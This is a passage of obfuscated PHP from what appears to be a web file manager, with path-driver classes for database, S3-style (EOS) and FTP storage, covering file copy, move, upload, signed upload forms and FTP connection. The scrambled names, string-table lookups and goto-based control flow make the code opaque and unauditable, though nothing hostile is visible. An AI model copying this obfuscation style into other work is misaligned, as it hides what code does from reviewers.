$cÀŸ”çö‰Á[$_SERVER[ÍÓÖ€°å][28]] : !1; } public function getPathOuter($CŞÙÙµÇŒš) { $DÒŒ¦êòƒ =& $_SERVER[ÍÓÖ€°å]; if (!$CŞÙÙµÇŒš) { return $CŞÙÙµÇŒš; } $a±èÓØ‰¯  = $this->pathPrase($CŞÙÙµÇŒš); if ($this->pathParse[$DÒŒ¦êòƒ[29]] == KodIO::KOD_SHARE_ITEM) { return KodIO::makeShare($this->pathParse[$DÒŒ¦êòƒ[357]], $a±èÓØ‰¯ [$DÒŒ¦êòƒ[357]]); } return KodIO::make($a±èÓØ‰¯ [$DÒŒ¦êòƒ[357]]); } public function copyFolderFromIO($EìğóÂğºº, $CÃ¢¬²Íá’, $b£Ò‡é¿ÔÔ, $f‚¯ìó¥’Ş, $EÇê¶Ò¥Ïº) { $b»İ„Ööî = $this->model->copyFolderFromIO($EìğóÂğºº, $CÃ¢¬²Íá’, $b£Ò‡é¿ÔÔ, $f‚¯ìó¥’Ş, $EÇê¶Ò¥Ïº); return KodIO::make($b»İ„Ööî); } public function isParentOf($få¯”š¹Ì, $dæöåö„©Š) { return $this->model->isParentOf($få¯”š¹Ì, $dæöåö„©Š); } public function mkfile($Eë…Ïƒ”©, $b¢ˆİ° ”© = '', $B¶«åº = REPEAT_RENAME) { $D½£¢ËÈİ… =& $_SERVER[ÍÓÖ€°å]; $AíÆÖÑ‘²— = $this->pathPrase($Eë…Ïƒ”©); $Eë…Ïƒ”© = $AíÆÖÑ‘²—[$D½£¢ËÈİ…[357]]; for ($E·‰—Õì‡ = 0; $E·‰—Õì‡ < count($AíÆÖÑ‘²—[$D½£¢ËÈİ…[828]]); $E·‰—Õì‡++) { $A®­ÏÍÛÃï = $AíÆÖÑ‘²—[$D½£¢ËÈİ…[828]][$E·‰—Õì‡]; $fŠ¿ñ´¼†Ÿ = "\120\141\164\150\104\x72\151\166\145\162\x44\102\x2e\x6d\153\x64\x69\x72\x2e{$Eë…Ïƒ”©}\x2e{$A®­ÏÍÛÃï}"; CacheLock::lock($fŠ¿ñ´¼†Ÿ); if ($E·‰—Õì‡ == count($AíÆÖÑ‘²—[$D½£¢ËÈİ…[828]]) - 1) { $Eë…Ïƒ”© = $this->model->mkfile($Eë…Ïƒ”©, $A®­ÏÍÛÃï, $b¢ˆİ° ”©, $B¶«åº); CacheLock::unlock($fŠ¿ñ´¼†Ÿ); break; } $Eë…Ïƒ”© = $this->model->mkdir($Eë…Ïƒ”©, $A®­ÏÍÛÃï, REPEAT_SKIP); CacheLock::unlock($fŠ¿ñ´¼†Ÿ); } return $this->getPathOuter($Eë…Ïƒ”©); } public function mkdir($dßÃÆÂÃ¹³, $AßĞ½ĞÄ´’ = REPEAT_SKIP) { $d§¿‰–Êäë =& $_SERVER[ÍÓÖ€°å]; $BØÀÍ¦­µ» = $this->pathPrase($dßÃÆÂÃ¹³); $dßÃÆÂÃ¹³ = $BØÀÍ¦­µ»[$d§¿‰–Êäë[357]]; for ($E¸ºˆ®êÊ = 0; $E¸ºˆ®êÊ < count($BØÀÍ¦­µ»[$d§¿‰–Êäë[828]]); $E¸ºˆ®êÊ++) { $dÔ¼‚†Àß = $BØÀÍ¦­µ»[$d§¿‰–Êäë[828]][$E¸ºˆ®êÊ]; $dÈöŠŒóŞõ = "\120\x61\x74\150\104\162\151\x76\x65\162\x44\x42\x2e\x6d\x6b\x64\151\162\x2e{$dßÃÆÂÃ¹³}\56{$dÔ¼‚†Àß}"; CacheLock::lock($dÈöŠŒóŞõ); $dßÃÆÂÃ¹³ = $this->model->mkdir($dßÃÆÂÃ¹³, $dÔ¼‚†Àß, $AßĞ½ĞÄ´’); CacheLock::unlock($dÈöŠŒóŞõ); } return $this->getPathOuter($dßÃÆÂÃ¹³); } public function copyFile($eÊ¢İ¦ó±â, $FÜ‚­åÇ†³, $F¦ ÚØ‚ß = REPEAT_REPLACE) { $b„ë’†ß÷Ë =& $_SERVER[ÍÓÖ€°å]; $eï—ŒÛ‹á = $this->pathPrase($FÜ‚­åÇ†³); $Fƒ­›èÛÕŒ = $this->model->copy($eÊ¢İ¦ó±â, $eï—ŒÛ‹á[$b„ë’†ß÷Ë[357]], $F¦ ÚØ‚ß, $eï—ŒÛ‹á[$b„ë’†ß÷Ë[76]]); return $Fƒ­›èÛÕŒ ? $this->getPathOuter($Fƒ­›èÛÕŒ) : !1; } public function moveFile($Eó¬ÒŞ¯äÊ, $A¦™š‰ÊÎ„, $B”¥Æ¢µŠš = REPEAT_REPLACE) { $fŒïà–µÆ· =& $_SERVER[ÍÓÖ€°å]; $f†ˆÜ¥ó = $this->pathPrase($A¦™š‰ÊÎ„); $B»¼ÔØê¥ = $this->model->move($Eó¬ÒŞ¯äÊ, $f†ˆÜ¥ó[$fŒïà–µÆ·[357]], $B”¥Æ¢µŠš, $f†ˆÜ¥ó[$fŒïà–µÆ·[76]]); return $B»¼ÔØê¥ ? $this->getPathOuter($B»¼ÔØê¥) : !1; } public function copy($F¹­¾œ•È, $A—‰»ğš, $cº„³»¼öŸ = REPEAT_REPLACE) { $EÆ²ß¶ÏÆ = $this->pathPrase($A—‰»ğš); $Aİ¡ğËÚ˜Û = $this->model->copy($F¹­¾œ•È, $EÆ²ß¶ÏÆ[$_SERVER[ÍÓÖ€°å][357]], $cº„³»¼öŸ); return $Aİ¡ğËÚ˜Û ? $this->getPathOuter($Aİ¡ğËÚ˜Û) : !1; } public function move($F¸ñ¨ÇŞİ², $eÍæ¥…š‘, $cÓÑØ¾¶¦ = REPEAT_REPLACE) { $CğÅ‘²ˆŠÖ = $this->pathPrase($eÍæ¥…š‘); $DÆã£ÔÁÄŒ = $this->model->move($F¸ñ¨ÇŞİ², $CğÅ‘²ˆŠÖ[$_SERVER[ÍÓÖ€°å][357]], $cÓÑØ¾¶¦); return $DÆã£ÔÁÄŒ ? $this->getPathOuter($DÆã£ÔÁÄŒ) : !1; } public function remove($a“ëô÷Âšƒ, $eŠ–¤æÖßº = true) { return $this->model->remove($a“ëô÷Âšƒ, $eŠ–¤æÖßº); } public function rename($aÔ¢Ôö¡…ù, $E£ª÷ãÈ£) { $Eé¾Ë°å÷İ = $this->model->rename($aÔ¢Ôö¡…ù, $E£ª÷ãÈ£); return $Eé¾Ë°å÷İ ? $this->getPathOuter($aÔ¢Ôö¡…ù) : $Eé¾Ë°å÷İ; } public function size($F¶åùêŠ„) { $c¬ÇŞô¨³ = $this->infoSimple($F¶åùêŠ„); return $c¬ÇŞô¨³ ? $c¬ÇŞô¨³[$_SERVER[ÍÓÖ€°å][78]] : 0; } public function infoSimple($BàÎßğÊÈ”) { return $this->model->sourceInfo($BàÎßğÊÈ”); } public function info($FÀ²†™œÂŸ) { return $this->infoParse($FÀ²†™œÂŸ); } public function infoAuth($e…¢„Ô¯­¦) { return $this->infoParse($e…¢„Ô¯­¦, !1, !0); } public function infoWithChildren($CÏÌõ–©‰) { return $this->infoParse($CÏÌõ–©‰, !0); } private function infoParse($Bïˆ‚ğŠ„, $c¸Ê³ˆ•è  = false, $c‘Õ„£†Ò = false) { $C¤¼Îæõ =& $_SERVER[ÍÓÖ€°å]; if ($this->pathParse[$C¤¼Îæõ[29]] == KodIO::KOD_SHARE_ITEM) { $EÔÅÜ·æ£˜ = $this->pathParse[$C¤¼Îæõ[357]]; $d®šÒ½ù„” = trim($this->pathParse[$C¤¼Îæõ[740]], $C¤¼Îæõ[8]); return ActionCall($C¤¼Îæõ[829], $EÔÅÜ·æ£˜, $d®šÒ½ù„”); } if ($this->pathParse[$C¤¼Îæõ[29]] == KodIO::KOD_SHARE_LINK) { return ActionCall($C¤¼Îæõ[830], $this->pathParse[$C¤¼Îæõ[76]]); } if (!$c¸Ê³ˆ•è ) { return $this->model->pathInfo($Bïˆ‚ğŠ„, $c‘Õ„£†Ò); } return $this->model->pathInfoMore($Bïˆ‚ğŠ„); } public function infoFull($D†ˆ†ô›È­) { goto A¼õµë·çõ; dšŒÅØ††: return $Aö•Î±Åá…; goto e‰Ï»áó; bÆÔÇÜáÚ‘: $e°¶õÜºÈ† = implode($e´†êÇ©„œ[8], array_splice($F…àÍª‹, 1)); $Aö•Î±Åá… = $this->model->pathInfoByPath($d°„¦Á‚Á, $e°¶õÜºÈ†); if ($this->pathParse[$e´†êÇ©„œ[29]] == KodIO::KOD_SHARE_ITEM) { $fÍ¯¬Ç’¦Ş = $this->pathParse[$e´†êÇ©„œ[357]]; $d°„¦Á‚Á = trim($this->pathParse[$e´†êÇ©„œ[740]], $e´†êÇ©„œ[8]); $Aö•Î±Åá… = ActionCall($e´†êÇ©„œ[829], $fÍ¯¬Ç’¦Ş, $d°„¦Á‚Á); } goto dšŒÅØ††; A¼õµë·çõ: $e´†êÇ©„œ =& $_SERVER[ÍÓÖ€°å]; $F…àÍª‹ = explode($e´†êÇ©„œ[8], $D†ˆ†ô›È­); $d°„¦Á‚Á = $F…àÍª‹[0]; goto bÆÔÇÜáÚ‘; e‰Ï»áó: } public function exist($eõ´¥’Ä¨í) { $e¬ˆˆéñ® =& $_SERVER[ÍÓÖ€°å]; $Eâ®Âàèí¥ = $this->pathPrase($eõ´¥’Ä¨í); if (!$Eâ®Âàèí¥[$e¬ˆˆéñ®[76]]) { return $this->isFile($eõ´¥’Ä¨í) || $this->isFolder($eõ´¥’Ä¨í); } $D™é´ÊäĞ  = array($e¬ˆˆéñ®[389] => $Eâ®Âàèí¥[$e¬ˆˆéñ®[357]], $e¬ˆˆéñ®[28] => $Eâ®Âàèí¥[$e¬ˆˆéñ®[76]]); $fİÂÎÎÅí = $this->model->where($D™é´ÊäĞ )->find(); return $fİÂÎÎÅí ? !0 : !1; } public function isFile($C‹¼äˆ•†´) { $CÀ‘‚î¹ô =& $_SERVER[ÍÓÖ€°å]; $E‚ÊÕÈÏ = $this->infoSimple($C‹¼äˆ•†´); return $E‚ÊÕÈÏ && $E‚ÊÕÈÏ[$CÀ‘‚î¹ô[366]] == $CÀ‘‚î¹ô[367] ? !1 : !0; } public function isFolder($dË¤Šƒğš…) { $aÕê±…°± =& $_SERVER[ÍÓÖ€°å]; $AêŞê®Ë•ù = $this->infoSimple($dË¤Šƒğš…); return $AêŞê®Ë•ù && $AêŞê®Ë•ù[$aÕê±…°±[366]] == $aÕê±…°±[367] ? !0 : !1; } public function listPath($cÀÛ§ŒŠˆõ, $BªÓŸ×ôÖÄ = false, $d¥òŒÚö = false) { $dŸÚ©î³î³ =& $_SERVER[ÍÓÖ€°å]; if ($cÀÛ§ŒŠˆõ == $dŸÚ©î³î³[33]) { return !1; } $aœ¬ò„ø Ê = array($dŸÚ©î³î³[389] => $cÀÛ§ŒŠˆõ); if ($d¥òŒÚö) { return $this->model->listSource($aœ¬ò„ø Ê, -1); } return $this->model->listSource($aœ¬ò„ø Ê); } public function has($Dê™™ÅŸ®‹, $E½¦åºè« = null) { return $this->model->hasChildren($Dê™™ÅŸ®‹, $E½¦åºè«); } public function listAll($bÎÜÌƒÖÒ) { return $this->model->listAll($bÎÜÌƒÖÒ); } public function getContent($fï¬Ö¸Œ¥À) { return $this->model->getContent($fï¬Ö¸Œ¥À); } public function setContent($F•³Êø¼•ê, $a£Ğ©×ø¹ = '') { return $this->model->setContent($F•³Êø¼•ê, $a£Ğ©×ø¹); } public function fileSubstr($B¾¸„ßÎÓ°, $eÉÄ°¡Á‚–, $d¬Á»¯‡áæ) { return $this->model->fileSubstr($B¾¸„ßÎÓ°, $eÉÄ°¡Á‚–, $d¬Á»¯‡áæ); } public function download($DöêÆÏã¼ë, $Cœ¤ÉÓ†Æ‚ = '') { $BåÛ½—ªÇ = $this->model->fileInfoGet($DöêÆÏã¼ë); IO::copy($BåÛ½—ªÇ[$_SERVER[ÍÓÖ€°å][76]], $Cœ¤ÉÓ†Æ‚); return $Cœ¤ÉÓ†Æ‚; } public function upload($Dº„š‘¯¹„, $eª”—Ëƒ, $f›‚«œ‰—å = false, $B Âá‘æ¬Õ = REPEAT_REPLACE) { $f À‡°¢Ä =& $_SERVER[ÍÓÖ€°å]; $B§¿ŒÉòË = $this->pathPrase($Dº„š‘¯¹„); $E “òÑ§İ± = $this->model->addFile($B§¿ŒÉòË[$f À‡°¢Ä[357]], $eª”—Ëƒ, $B§¿ŒÉòË[$f À‡°¢Ä[76]], $f›‚«œ‰—å, $B Âá‘æ¬Õ); return $this->getPathOuter($E “òÑ§İ±); } public function uploadFileByID($F«ŞÃÕ£¡, $DÑøŞÂôÖã, $d£ÈÊß¶§’) { $cáÈšŞç =& $_SERVER[ÍÓÖ€°å]; $d¥®Ø•¢— = $this->pathPrase($F«ŞÃÕ£¡); $eÃäøØç“ = $this->model->addFileByFileID($d¥®Ø•¢—[$cáÈšŞç[357]], $DÑøŞÂôÖã, $d¥®Ø•¢—[$cáÈšŞç[76]], $d£ÈÊß¶§’); return $this->getPathOuter($eÃäøØç“); } public function addFileByRemote($C×„¡¡Œ¾´, $B¯ŠÔõå¦, $BæìîÇê’· = array(), $aŸ’¢›Š¼ù = '', $Cô×ãÁÔ‚) { $CÈÕ„·ƒÕ• =& $_SERVER[ÍÓÖ€°å]; $AÏ¾îš¾Í¦ = $this->pathPrase($C×„¡¡Œ¾´); $aŸ’¢›Š¼ù = empty($aŸ’¢›Š¼ù) ? $AÏ¾îš¾Í¦[$CÈÕ„·ƒÕ•[76]] : $aŸ’¢›Š¼ù; $CœšË” ¶ = $this->model->addFileByRemote($AÏ¾îš¾Í¦[$CÈÕ„·ƒÕ•[357]], $B¯ŠÔõå¦, $aŸ’¢›Š¼ù, $BæìîÇê’·, $Cô×ãÁÔ‚); return $this->getPathOuter($CœšË” ¶); } public function uploadLink($fé¹„Àéã, $CõŠÏ­ª££ = 0) { $c¸âŸÀéñ™ =& $_SERVER[ÍÓÖ€°å]; $d¶î­”íÂ½ = $this->pathPrase($fé¹„Àéã); $fé¹„Àéã = Model($c¸âŸÀéñ™[418])->createFileName($d¶î­”íÂ½[$c¸âŸÀéñ™[76]]); $d¨™Îá¸ï = IO::uploadLink($fé¹„Àéã, $CõŠÏ­ª££); return $d¨™Îá¸ï; } public function fileNameAuto($a¥Ó½é‹ß, $cá«ƒõŠ¼, $bèõôÆ = REPEAT_REPLACE, $aêÂ›Ã¯ = false) { return $this->model->fileNameAuto($a¥Ó½é‹ß, $cá«ƒõŠ¼, $bèõôÆ, $aêÂ›Ã¯); } public function fileNameExist($d®¬•ë×¹Æ, $Fô½Ø† Ë·) { return $this->model->fileNameExist($d®¬•ë×¹Æ, $Fô½Ø† Ë·); } private function _fileOut($A²ìØìñ, $Bé±Ã´ŞÈ“ = false, $bî±Œ¬‡½² = false, $D‡òÛæõ¬  = '', $a¤´³¶áÄ¶ = false) { goto fÒİöÍÃ¿; FöòÇ¤Â§: $A×ÁÓ¦ ™µ = $this->model->fileInfoGet($A²ìØìñ); $D‡òÛæõ¬  = $A×ÁÓ¦ ™µ[$b•Ë‰’æ‚‹[151]] ? $A×ÁÓ¦ ™µ[$b•Ë‰’æ‚‹[151]] : $D‡òÛæõ¬ ; if ($a¤´³¶áÄ¶) { return IO::fileOutServer($A×ÁÓ¦ ™µ[$b•Ë‰’æ‚‹[76]], $Bé±Ã´ŞÈ“, $A×ÁÓ¦ ™µ[$b•Ë‰’æ‚‹[28]], $D‡òÛæõ¬ ); } goto b²¥éã…Ôã; fÒİöÍÃ¿: $b•Ë‰’æ‚‹ =& $_SERVER[ÍÓÖ€°å]; $fƒŸ‚ëì¾ = $this->model->sourceInfo($A²ìØìñ); if ($fƒŸ‚ëì¾[$b•Ë‰’æ‚‹[366]] == $b•Ë‰’æ‚‹[367]) { header($b•Ë‰’æ‚‹[831]); die; } goto FöòÇ¤Â§; b²¥éã…Ôã: IO::fileOut($A×ÁÓ¦ ™µ[$b•Ë‰’æ‚‹[76]], $Bé±Ã´ŞÈ“, $A×ÁÓ¦ ™µ[$b•Ë‰’æ‚‹[28]], $D‡òÛæõ¬ ); goto b±°è¥¿ñ; b±°è¥¿ñ: } public function fileOut($a·ÒÕ„º, $c±äˆíÓÅ = false, $DóèÀ§æå = false, $DÑ™ĞĞ¥´š = '') { $this->_fileOut($a·ÒÕ„º, $c±äˆíÓÅ, $DóèÀ§æå, $DÑ™ĞĞ¥´š); } public function fileOutServer($FàæÓ°Üƒï, $a›¶ƒ¢à = false, $CêóùÛÙ‚‰ = false, $BƒŒ•ù÷¬İ = '') { $this->_fileOut($FàæÓ°Üƒï, $a›¶ƒ¢à, $CêóùÛÙ‚‰, $BƒŒ•ù÷¬İ, !0); } private function _fileOutImage($aöòì¹ÙŸÃ, $aªÀ†Ä„Æ = 250) { $d÷­¨™ë¨ =& $_SERVER[ÍÓÖ€°å]; $bèÜœßàĞ… = $this->model->sourceInfo($aöòì¹ÙŸÃ); if ($bèÜœßàĞ…[$d÷­¨™ë¨[366]] == $d÷­¨™ë¨[367]) { show_json($d÷­¨™ë¨[832] . $aöòì¹ÙŸÃ, !1); } $b»ó¢Ë¢± = $this->model->fileInfoGet($aöòì¹ÙŸÃ); IO::fileOutImage($b»ó¢Ë¢±[$d÷­¨™ë¨[76]], $aªÀ†Ä„Æ); } public function fileOutImage($FäìæŒãÈÓ, $a¥ÛÛëòÕ‰ = 250) { $this->_fileOutImage($FäìæŒãÈÓ, $a¥ÛÛëòÕ‰); } public function fileOutImageServer($Bô§ŒÃŞÓ, $EŸµÖœœ¸» = 250) { $this->_fileOutImage($Bô§ŒÃŞÓ, $EŸµÖœœ¸»); } public function link($e›’¢Ú„Í, $d£›Œäìê = '') { $CŞ©½ø’˜‹ = $this->model->fileInfoGet($e›’¢Ú„Í); return IO::link($CŞ©½ø’˜‹[$_SERVER[ÍÓÖ€°å][76]], $d£›Œäìê); } protected function pathPrase($D«ŠÃÕÒì) { $e›•÷µ¾öÆ =& $_SERVER[ÍÓÖ€°å]; if (strstr($D«ŠÃÕÒì, $e›•÷µ¾öÆ[8]) === !1) { return array($e›•÷µ¾öÆ[789] => intval($D«ŠÃÕÒì), $e›•÷µ¾öÆ[76] => $e›•÷µ¾öÆ[33], $e›•÷µ¾öÆ[828] => array()); } $b¯Ãç¬ò = explode($e›•÷µ¾öÆ[8], trim($D«ŠÃÕÒì, $e›•÷µ¾öÆ[8])); if (count($b¯Ãç¬ò) < 2) { show_tips($D«ŠÃÕÒì . $e›•÷µ¾öÆ[833]); } return array($e›•÷µ¾öÆ[789] => intval($b¯Ãç¬ò[0]), $e›•÷µ¾öÆ[76] => $b¯Ãç¬ò[1], $e›•÷µ¾öÆ[828] => array_slice($b¯Ãç¬ò, 1)); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($cƒàÏöÍ«) { parent::__construct($cƒàÏöÍ«); $this->signatureVersion($_SERVER[ÍÓÖ€°å][188]); } public function uploadFormData($e¢ŠÁŞó, $b÷ÇäÈ•¸ = 3600) { goto aÖ´êã§¾¯; F¬¸»İÒã¾: $cª®˜â¾å¿ = array($this->accessKey, $b™ªƒÙÕï¦, $this->region, $BŠôÀµêã, $CÌÑ™ŒÊÕÎ); $f¾¥òÎå› = implode($béÍí”õµ§[8], $cª®˜â¾å¿); $c½ìê¦Úñ» = array($béÍí”õµ§[814] => gmdate($béÍí”õµ§[813], strtotime($béÍí”õµ§[837])), $béÍí”õµ§[815] => array(array($béÍí”õµ§[817] => $this->bucket), array($béÍí”õµ§[816] => $e¾Ñùİäòæ), array($béÍí”õµ§[818], $béÍí”õµ§[819], $béÍí”õµ§[33]), array($béÍí”õµ§[818], $béÍí”õµ§[838], $béÍí”õµ§[33]), array($béÍí”õµ§[818], $béÍí”õµ§[839], $béÍí”õµ§[33]), array($béÍí”õµ§[820] => $eô¶–°‚§Õ), array($béÍí”õµ§[840] => $f¾¥òÎå›), array($béÍí”õµ§[841] => $e³¹È±šÙÖ), array($béÍí”õµ§[842] => $AäôÎ³‰¿Î), array($béÍí”õµ§[843] => $dİŸ‘æ”Ï))); goto cÛ¬ø¶÷œ; eå£¯ƒµŠ§: $BŠôÀµêã = $béÍí”õµ§[59]; $AäôÎ³‰¿Î = gmdate($béÍí”õµ§[835]); $b™ªƒÙÕï¦ = gmdate($béÍí”õµ§[438]); goto dÔ«ÌšÌãæ; f‹¯¹Ü»: $b’ˆÁÈË¾ê = array($béÍí”õµ§[187] => $béÍí”õµ§[33], $béÍí”õµ§[846] => $béÍí”õµ§[33], $béÍí”õµ§[816] => $e¾Ñùİäòæ, $béÍí”õµ§[820] => $eô¶–°‚§Õ, $béÍí”õµ§[824] => $fçÆÜ§ãôƒ, $béÍí”õµ§[847] => $f¾¥òÎå›, $béÍí”õµ§[848] => $e³¹È±šÙÖ, $béÍí”õµ§[849] => $AäôÎ³‰¿Î, $béÍí”õµ§[850] => $dİŸ‘æ”Ï, $béÍí”õµ§[851] => $e¡¶µÀ‘˜¦, $béÍí”õµ§[157] => $this->getHost()); return $b’ˆÁÈË¾ê; goto B–‰ïÏ÷·; aÖ´êã§¾¯: $béÍí”õµ§ =& $_SERVER[ÍÓÖ€°å]; $e¾Ñùİäòæ = $béÍí”õµ§[173]; $e³¹È±šÙÖ = $béÍí”õµ§[834]; goto eå£¯ƒµŠ§; FÚÒšÌâÄŞ: $eŒÉÓî˜¥ = hash_hmac($béÍí”õµ§[844], $BŠôÀµêã, $E‘©®¥¨Ê, !0); $Céí‹ˆ¬ = hash_hmac($béÍí”õµ§[844], $CÌÑ™ŒÊÕÎ, $eŒÉÓî˜¥, !0); $e¡¶µÀ‘˜¦ = hash_hmac($béÍí”õµ§[844], $fçÆÜ§ãôƒ, $Céí‹ˆ¬); goto f‹¯¹Ü»; dÔ«ÌšÌãæ: $CÌÑ™ŒÊÕÎ = $béÍí”õµ§[836]; $dİŸ‘æ”Ï = $b÷ÇäÈ•¸ . $béÍí”õµ§[33]; $eô¶–°‚§Õ = $béÍí”õµ§[812]; goto F¬¸»İÒã¾; cÛ¬ø¶÷œ: $fçÆÜ§ãôƒ = base64_encode(json_encode($c½ìê¦Úñ»)); $bùÏˆïÄ“Å = hash_hmac($béÍí”õµ§[844], $b™ªƒÙÕï¦, $béÍí”õµ§[845] . $this->secret, !0); $E‘©®¥¨Ê = hash_hmac($béÍí”õµ§[844], $this->region, $bùÏˆïÄ“Å, !0); goto FÚÒšÌâÄŞ; B–‰ïÏ÷·: } public function fileOutLink($bãËÊİ°) { header($_SERVER[ÍÓÖ€°å][146] . $bãËÊİ°); die; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $port = 21; private $scheme = ''; private $connect = FALSE; public function __construct($EŠ­İˆÙ¢â) { parent::__construct(); if (count($EŠ­İˆÙ¢â) > 0) { $this->_init($EŠ­İˆÙ¢â); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function resetCharset($Dù„šˆñ¡Ø) { $cÑµîË–¶¿ =& $_SERVER[ÍÓÖ€°å]; global $config; $this->appCharset = $config[$cÑµîË–¶¿[852]]; $this->systemCharset = $config[$cÑµîË–¶¿[853]]; if (isset($Dù„šˆñ¡Ø[$cÑµîË–¶¿[854]]) && $Dù„šˆñ¡Ø[$cÑµîË–¶¿[854]]) { $this->systemCharset = $Dù„šˆñ¡Ø[$cÑµîË–¶¿[854]]; } } public function iconvApp($f‚‰Ä¤éæß) { return $this->iconvTo($f‚‰Ä¤éæß, $this->systemCharset, $this->appCharset); } public function iconvSystem($C¹³Ã×Ì¿) { return $this->iconvTo($C¹³Ã×Ì¿, $this->appCharset, $this->systemCharset); } public function getPathOuter($fóÃ§¨¢å) { goto b˜¤Ü·…Åé; D“öÇ¼ˆßï: if (substr($A×Ë©Ñ¸Ş, 0, 2) == $fÂ‹‹ŞåáÇ[855]) { $A×Ë©Ñ¸Ş = BASIC_PATH . substr($A×Ë©Ñ¸Ş, 2); } if (substr($fóÃ§¨¢å, 0, 2) == $fÂ‹‹ŞåáÇ[855]) { $fóÃ§¨¢å = BASIC_PATH . substr($fóÃ§¨¢å, 2); } $A×Ë©Ñ¸Ş = KodIO::clear($A×Ë©Ñ¸Ş); goto F­ëïÕ‰ö‰; b˜¤Ü·…Åé: $fÂ‹‹ŞåáÇ =& $_SERVER[ÍÓÖ€°å]; $A×Ë©Ñ¸Ş = $this->iconvApp($this->pathBase); $fóÃ§¨¢å = $this->iconvApp($fóÃ§¨¢å); goto D“öÇ¼ˆßï; F­ëïÕ‰ö‰: $fóÃ§¨¢å = KodIO::clear($fóÃ§¨¢å); $fóÃ§¨¢å = substr($fóÃ§¨¢å, strlen($A×Ë©Ñ¸Ş)); if (empty($this->pathDriver)) { return $fóÃ§¨¢å; } goto AèÌğÒì°Ç; AèÌğÒì°Ç: return $this->pathDriver . $fÂ‹‹ŞåáÇ[8] . ltrim($fóÃ§¨¢å, $fÂ‹‹ŞåáÇ[8]); goto e‹£¢Çä¬ç; e‹£¢Çä¬ç: } private function _init($eÆ¯¼ŞîÒë = array()) { goto Cƒ¸Âé•Ûå; F†ÚÑñ’Õ»: $this->scheme = $BŸÙ­…Ä÷ ? $BÎå…©Øö[860] : $BÎå…©Øö[861]; $this->server = preg_replace($BÎå…©Øö[862], $BÎå…©Øö[33], $this->server); $this->connect = @ftp_connect($this->server, $this->port, 5); goto b‚Êñ©äŠ; Cƒ¸Âé•Ûå: $BÎå…©Øö =& $_SERVER[ÍÓÖ€°å]; if (!function_exists($BÎå…©Øö[856])) { show_json(LNG($BÎå…©Øö[857]), !1); } $this->resetCharset($eÆ¯¼ŞîÒë); goto DôÈÓä˜—õ; b‚Êñ©äŠ: if ($this->connect === !1) { return; } $B¯ç¿¢­è¨ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_pasv($this->connect, !0); goto B–´ŸèÁÀ; DôÈÓä˜—õ: foreach ($eÆ¯¼ŞîÒë as $E²¶ô…¯® => $d¬’…‹¸íÆ) { if (isset($this->{$E²¶ô…¯®})) { $this->{$E²¶ô…¯®} = $d¬’…‹¸íÆ; } } $F‚È§¥—ÄĞ = explode($BÎå…©Øö[858], $this->server); $BŸÙ­…Ä÷ = strtolower(trim($F‚È§¥—ÄĞ[0])) == $BÎå…©Øö[859] ? !0 : !1; goto F†ÚÑñ’Õ»; B–´ŸèÁÀ: return $B¯ç¿¢­è¨; goto D²ƒ¯Öí‘; D²ƒ¯Öí‘: } private function _isconn() { return is_resource($this->connect); } public function mkfile($bÔ¢ÇóÁ¬“, $Bİ‡ÏÔÊ‘ó = '', $a¾íÉ¤Õ = REPEAT_RENAME) { goto d®à‡ÌãĞ; b·¶£ÖÂõ: $a ·æ¬ˆÊÅ = $this->upload($this->iconvApp($bÔ¢ÇóÁ¬“), $this->iconvApp($C¢„¿„‰æÏ)); $this->tempFileRemve($C¢„¿„‰æÏ); return $a ·æ¬ˆÊÅ ? $this->getPathOuter($bÔ¢ÇóÁ¬“) : !1; goto EÎÉå©ã—; a×Ç‘ï——Š: $bÔ¢ÇóÁ¬“ = $this->iconvSystem($bÔ¢ÇóÁ¬“); $C¢„¿„‰æÏ = $this->tempFile($this->pathThis($bÔ¢ÇóÁ¬“)); if ($Bİ‡ÏÔÊ‘ó) { file_put_contents($C¢„¿„‰æÏ, $Bİ‡ÏÔÊ‘ó); } goto b·¶£ÖÂõ; d®à‡ÌãĞ: if (!$this->_isconn()) { return !1; } $Dä¾ÛÄ•é¬ = $this->pathFather($bÔ¢ÇóÁ¬“); if (!$this->isFolder($Dä¾ÛÄ•é¬) && !$this->mkdir($Dä¾ÛÄ•é¬)) { return !1; } goto a×Ç‘ï——Š; EÎÉå©ã—: } public function mkdir($Cñ¬æÅõò, $aÊ‡‚«‡ëä = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Cñ¬æÅõò = $this->iconvSystem($Cñ¬æÅõò); if ($this->isFolder($Cñ¬æÅõò) || @ftp_mkdir($this->connect, $Cñ¬æÅõò)) { return $this->getPathOuter($Cñ¬æÅõò); } if (!$this->mkdir($this->pathFather($Cñ¬æÅõò))) { return !1; } if ($Cñ¬æÅõò = @ftp_mkdir($this->connect, $Cñ¬æÅõò)) { return $this->getPathOuter($Cñ¬æÅõò); } return !1; } public function copyFile($BåÀÙğŠÍ°, $bÔ‰ÚñØÎÅ) { goto d—µÈ‰»£; d—µÈ‰»£: if (!$this->_isconn()) { return !1; } $Eƒ½¤ÅíÒé = $this->pathThis($this->iconvSystem($BåÀÙğŠÍ°)); $Câåğà¢Ğ» = $this->tempFile($Eƒ½¤ÅíÒé); goto c †¨Æ³; c †¨Æ³: $a†¦äö—éº = $this->iconvApp($Câåğà¢Ğ»); $this->download($BåÀÙğŠÍ°, $a†¦äö—éº); $a×Ì¦¢›’ = $this->upload($bÔ‰ÚñØÎÅ, $a†¦äö—éº); goto döæ­É´õ¢; döæ­É´õ¢: $this->tempFileRemve($Câåğà¢Ğ»); return $a×Ì¦¢›’; goto B¢æ„¢¸“ƒ; B¢æ„¢¸“ƒ: } public function moveFile($CĞ‘İ‹´ÄÌ, $Eİœ‚±ä) { if (!$this->_isconn()) { return !1; } $CĞ‘İ‹´ÄÌ = $this->iconvSystem($CĞ‘İ‹´ÄÌ); $Eİœ‚±ä = $this->iconvSystem($Eİœ‚±ä); $f‚Á¿Ã®õ× = @ftp_rename($this->connect, $CĞ‘İ‹´ÄÌ, $Eİœ‚±ä); return $f‚Á¿Ã®õ× ? $this->getPathOuter($Eİœ‚±ä) : !1; } public function delFile($eÌ¸ªì‹¥¾) { if (!$this->_isconn()) { return !1; } $eÌ¸ªì‹¥¾ = $this->iconvSystem($eÌ¸ªì‹¥¾); return @ftp_delete($this->connect, $eÌ¸ªì‹¥¾); } public function delFolder($CÒËÎ«¢íÅ) { if (!$this->_isconn()) { return !1; } $CÒËÎ«¢íÅ = 